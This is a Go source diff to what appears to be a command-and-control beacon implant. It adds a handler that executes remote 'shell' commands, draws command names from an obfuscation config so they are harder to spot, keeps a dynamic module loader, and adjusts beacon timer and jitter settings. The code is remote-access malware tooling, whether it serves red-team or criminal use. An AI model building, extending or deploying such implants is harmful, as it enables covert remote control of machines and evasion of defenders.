@@ -7,6 +7,7 @@ import (
 	"strings"
 
 	httpFuncs "src/Client/beacon/http"
+	"src/Client/generic/commands"
 	"src/Client/generic/config"
 	"src/Client/generic/logger"
 	"src/Client/generic/rpc_client"
@@ -30,14 +31,22 @@ func init() {
 		logger.Log("switching to 'session' mode")
 		return "ack", true
 	}
+	handlers[config.Obfuscation.Generic.Commands.Shell.Name] = func(cmd httpFuncs.CommandData, data string) (string, bool) {
+		logger.Log("Processing 'shell' command.")
+		commands, err := commands.BeaconShellCommand(data)
+		if err != nil {
+			logger.Error(fmt.Sprintf("Failed to process 'shell' command: %v", err))
+			return "Error: Failed to process 'shell' command: " + err.Error(), false
+		}
+		return commands, false
+	}
 	handlers["update"] = func(cmd httpFuncs.CommandData, data string) (string, bool) {
 		logger.Log("Processing 'update' command.")
 		return handleUpdateCommand(cmd.Data), false
 	}
 	// module loader remains special case
-	handlers["module"] = func(cmd httpFuncs.CommandData, data string) (string, bool) {
+	handlers[config.Obfuscation.Generic.Commands.Module.Name] = func(cmd httpFuncs.CommandData, data string) (string, bool) {
 		logger.Log("Loading dynamic content for 'module' command.")
-
 		var moduleData struct {
 			Name string `json:"name"`
 			Data string `json:"data"`
@@ -89,6 +98,7 @@ func executeCommand(command httpFuncs.CommandData) (httpFuncs.CommandReport, boo
 			outputMsg = fmt.Sprintf("Error executing %s: %v", command.Command, err)
 		}
 	} else {
+		logger.Log(fmt.Sprintf("list of handlers"))
 		logger.Log(fmt.Sprintf("Processing generic command: '%s'", command.Command))
 		outputMsg = handleGenericCommand(command)
 	}
@@ -111,13 +121,13 @@ func handleUpdateCommand(data json.RawMessage) string {
 
 	if updateData.Timer > 0 {
 		config.Timer = updateData.Timer
-		outputMsgs = append(outputMsgs, fmt.Sprintf("Timer set to %d", config.Timer))
-		logger.Log(fmt.Sprintf("Timer updated to %d seconds", config.Timer))
+		outputMsgs = append(outputMsgs, fmt.Sprintf("Timer set to %f", config.Timer))
+		logger.Log(fmt.Sprintf("Timer updated to %f seconds", config.Timer))
 	}
 	if updateData.Jitter >= 0 {
 		config.Jitter = updateData.Jitter
-		outputMsgs = append(outputMsgs, fmt.Sprintf("Jitter set to %d", config.Jitter))
-		logger.Log(fmt.Sprintf("Jitter updated to %d seconds", config.Jitter))
+		outputMsgs = append(outputMsgs, fmt.Sprintf("Jitter set to %f", config.Jitter))
+		logger.Log(fmt.Sprintf("Jitter updated to %f seconds", config.Jitter))
 	}
 
 	if len(outputMsgs) == 0 {
